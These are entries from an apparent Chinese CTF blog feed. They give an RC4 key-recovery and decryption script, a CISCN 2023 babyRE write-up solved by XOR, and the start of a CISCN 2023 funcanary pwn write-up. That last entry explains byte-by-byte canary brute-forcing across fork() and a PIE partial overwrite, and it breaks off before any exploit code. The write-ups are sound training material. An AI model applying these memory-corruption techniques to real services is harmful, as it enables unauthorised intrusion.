取四字节数据的最低一字节 </span>        v12<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>          v12<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">BYTE2</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>          v12<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>          v11 <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>          v10 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      cout<span class="token operator">&lt;&lt;</span><span class="token string">"key: "</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s_box<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token function">rc4_init</span><span class="token punctuation">(</span>s_box<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s_box<span class="token punctuation">,</span> enc<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">Destination <span class="token operator">=</span> <span class="token string">"!This_program_cannot"</span>  Key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>  v7 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">7225</span><span class="token punctuation">,</span> <span class="token number">614125</span><span class="token punctuation">,</span> <span class="token number">52200625</span><span class="token punctuation">]</span>  v11 <span class="token operator">=</span> <span class="token number">0</span>  v10 <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"v8: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">while</span> v11 <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">:</span>      v8 <span class="token operator">=</span> <span class="token number">0</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">if</span> Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">122</span><span class="token punctuation">:</span>              Key<span class="token punctuation">[</span>i <span class="token operator">+</span> v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              v8 <span class="token operator">+=</span> v7<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>Destination<span class="token punctuation">[</span>i <span class="token operator">+</span> v11<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">33</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>        Key<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8 <span class="token operator">&amp;</span> <span class="token number">0xFF</span>      Key<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>      Key<span class="token punctuation">[</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>      Key<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>        v11 <span class="token operator">+=</span> <span class="token number">5</span>      v10 <span class="token operator">+=</span> <span class="token number">4</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Key: "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      Str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span>         <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">]</span>  <span class="token comment">## 待加解密的内容  </span>flag <span class="token operator">=</span> <span class="token string">""</span>  <span class="token comment">## 存放加解密后的结果  </span>  <span class="token comment">## ---------- rc4_init ----------  </span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment">## 定义 s 盒  </span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">## 生成初始 s 盒  </span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>      <span class="token comment">##   T[i] = K[i mod len(Key)]    ## 这个算法里没有 T[i]，下面会解释  </span>t <span class="token operator">=</span> <span class="token number">0</span>  j <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">## 打乱 s 盒顺序  </span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Key<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment">## j = (j + S[i] + T[i]) mod 256  </span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>      s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp      t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment">## 这里引入的 t 加一个 if 条件其实就是为了做 t = i % len(Key)</span>    <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">## Key[t] 配合 t = i % len(Key) 就是实现了 T[i] = K[i mod len(Key)]</span>    t <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 小细节写法不同而已，大致思路是一样的  </span>  <span class="token comment">## ---------- rc4_crypt ----------  </span>i <span class="token operator">=</span> <span class="token number">0</span>  j <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment">## &amp; 0xff 是为了做 % 256，两者效果相同  </span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>      s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp      t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>  <span class="token comment">## &amp; 0xff 是为了做 % 256，两者效果相同  </span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">## 明文异或得密文，密文异或得明文  </span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>SYC{Th1s_is_@_EasY_3ncryptO!!!!}</p></blockquote>]]></content>
    
    
    <summary type="html">主要是 RC4 加密和 TLS 回调函数的反调试，逻辑不难，只是密钥有一点不好找，总共有三个密钥，两个可以直接找到的密钥是假的，真正的密钥是通过两个独立线程利用 TLS 回调函数的特性进行反调试和修改的</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【CISCN 2023】babyRE</title>
    <link href="https://www.4ss1du0us.cn/2023/06414590d0.html"/>
    <id>https://www.4ss1du0us.cn/2023/06414590d0.html</id>
    <published>2023-06-13T07:47:24.000Z</published>
    <updated>2023-07-04T05:55:33.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>XML 文件可以是 Snap! 图像编程语言的文件，可以根据 XML 的 <code>&lt;project name=&quot;re4baby22&quot; app=&quot;Snap! 8.2, https://snap.berkeley.edu&quot; version=&quot;2&quot;&gt;</code> 得知</li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】babyRE</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载得到一个 <code>babyre.xml</code> 文件，VScode 打开发现很乱，无法阅读：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE1.png" alt="CISCN2023-babyRE1.png"><br>使用浏览器打开分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE2.png" alt="CISCN2023-babyRE2.png"><br>搜索 flag，发现一个字符串 <code>flag&#123;o_shit_i_dont_know_that&#125;</code>，但明显不是真正的 flag<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE3.png" alt="CISCN2023-babyRE3.png"><br>不过有一串可疑的数据：<code>102,10,13,6,28,20,48,44,27,1,29,43,54,54,59,11,1,26,43,52,5,1,24,40,43,28,9,21,9</code></p></li><li><p>由于阅读文件内容无果，但是注意到 XML 项目文件是由 <code>Snap!</code> 生成的<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE4.png" alt="CISCN2023-babyRE4.png"><br>百度可知这是一个图形编程语言：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE5.png" alt="CISCN2023-babyRE5.png"><br>进入官网：<a href="https://snap.berkeley.edu/">https://snap.berkeley.edu</a><br>创建新项目，发现可以导入项目，将刚刚的 <code>babyre.xml</code> 导入进来：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE6.png" alt="CISCN2023-babyRE6.png"><br>根据提示运行项目，点击右上角绿色旗帜，按空格键<br>发现运行到一个带锁的界面，要求输入 flag：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE7.png" alt="CISCN2023-babyRE7.png"><br>双击锁的图案，在中间一栏出现逻辑：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE8.png" alt="CISCN2023-babyRE8.png"></p></li><li><p>分析流程可知，当询问 “Give me the flag” 时，输入的回答 <code>key</code> 就是最终的 flag<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE9.png" alt="CISCN2023-babyRE9.png"><br>当 <code>is_ok = 1</code> 时，说明输入正确<br>找到 <code>secret</code> 的生成流程：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE10.png" alt="CISCN2023-babyRE10.png"><br>最终得到的 <code>secret</code> 为：<code>[102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25, 81, 83, 7, 28, 76, 88, 9, 0, 29, 73, 0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30]</code></p></li><li><p>根据校验逻辑编写脚本即可，校验比较简单<br>主要是异或操作：<code>return a^b</code><br>已知 <code>key</code> 的第一项为 102，即字符 <code>&#39;f&#39;</code><br>根据 <code>key[i] ^ key[i - 1] = secret[i]</code>，依次求出后续 <code>key</code> 值</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">secret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>       <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token string">'f'</span>  <span class="token comment"># 102  </span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> secret<span class="token punctuation">[</span>i<span class="token punctuation">]</span>      key <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-babyRE11.png" alt="CISCN2023-babyRE11.png"></p>]]></content>
    
    
    <summary type="html">第十六届 CISCN 国赛初赛的一道题，比较简单，主要是涉及到 Snap! 语言，如果发现了 XML 文件其实是这个语言的话，到官网上将 XML 文件导入，就可以很清晰地看到代码的逻辑了，如果没发现 Snap! 可能会稍微麻烦一点</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【CISCN 2023】funcanary</title>
    <link href="https://www.4ss1du0us.cn/2023/0629b86fa0.html"/>
    <id>https://www.4ss1du0us.cn/2023/0629b86fa0.html</id>
    <published>2023-06-12T07:16:22.000Z</published>
    <updated>2023-07-02T07:56:12.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>通过 <code>fork()</code> 函数产生的 canary 金丝雀的值可以通过 one-by-one 爆破</mark>，canary 的最后一字节为 <code>b&#39;\x00&#39;</code>，对于 64 位程序需要爆破出前七个字节</p></li><li><p><mark>开启 PIE 地址随机化时，可以利用 PIE 的漏洞，即：<strong>地址的低三位不会发生改变</strong>，可以对地址进行爆破</mark></p></li><li><p><mark>在爆破 canary 和 真实地址时，发送数据用 <code>io.send()</code>，不可以用 <code>io.sendline()</code></mark>，否则会将爆破的下一位修改为回车符（<code>0x0a</code>），导致爆破失败</p></li></ul><hr><p><a href="https://ctf.ichunqiu.com/2023ciscn">（2023年5月27日-2023年5月28日）【CISCN 2023】funcanary</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>分析程序：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary1.png" alt="CISCN2023-funcanary1.png"><br>权限开满了</p></li><li><p>丢到 IDA 分析：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary2.png" alt="CISCN2023-funcanary2.png"><br>发现程序会使用 <code>fork()</code> 生成子进程，注意：<strong>子进程崩溃不会导致父进程退出</strong><br>跟进 <code>sub_128A()</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary3.png" alt="CISCN2023-funcanary3.png"><br>在输入 <code>buf</code> 处存在溢出：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary4.png" alt="CISCN2023-funcanary4.png"><br>但是有 canary 金丝雀保护</p></li><li><p>在函数列表中查找后门函数无果<br>查看字符串，发现 <code>&#39;/bin/cat flag&#39;</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary5.png" alt="CISCN2023-funcanary5.png"><br>跟进位置：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/CISCN2023-funcanary6.png" alt="CISCN2023-funcanary6.png"><br>发现有 <code>system(&quot;/bin/cat flag&quot;)</code></p></li><li><p>所以思路很清晰了，就是首先通过 one-by-one 爆破 canary 绕过金丝雀，然后通过 <code>buf</code> 的溢出跳转到后门函数执行 <code>system(&quot;/bin/cat flag&quot;)</code></p></li></ol><blockquote><p><strong>注意：</strong><br>通过 <code>fork()</code> 函数产生的 canary 金丝雀的值是固定不变的（<em>同一个进程中的不同线程的 canary 是相同的</em>），因为子进程会完全复制父进程地址空间的内容，所以可以爆破 canary 的值，利用子进程进行溢出，每次只溢出一个字节，直到溢出的这一个字节值是正确的，再溢出下一个字节</p><p>由于 canary 的低一位字节固定为 <code>&quot;\00&quot;</code>，因此只需要爆破前七位字节，如此反复直到爆破完七位即可得到 canary 的值，每一字节的取值范围在 <code>0 ~ 255</code></p></blockquote><ol start="5"><li>由于还开启了 PIE 地址随机化，所以后门函数的地址 <code>0x1231</code> 不是真实地址，但是可以利用 PIE 地址随机化的漏洞，即：<strong>地址的低三位不会发生改变</strong></li></ol><blockquote><p><code>partial write</code>（部分写入）是一种利用了 PIE 技术缺陷的 bypass 技术</p><p>由于内存的分页管理机制，如果开启 PIE 保护的话，只能影响到单个内存页，一个内存页大小为 <code>0x1000</code>，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数是始终不变的</p></blockquote><ol start="6"><li>因此，根据后门函数的地址 <code>0x1231</code> 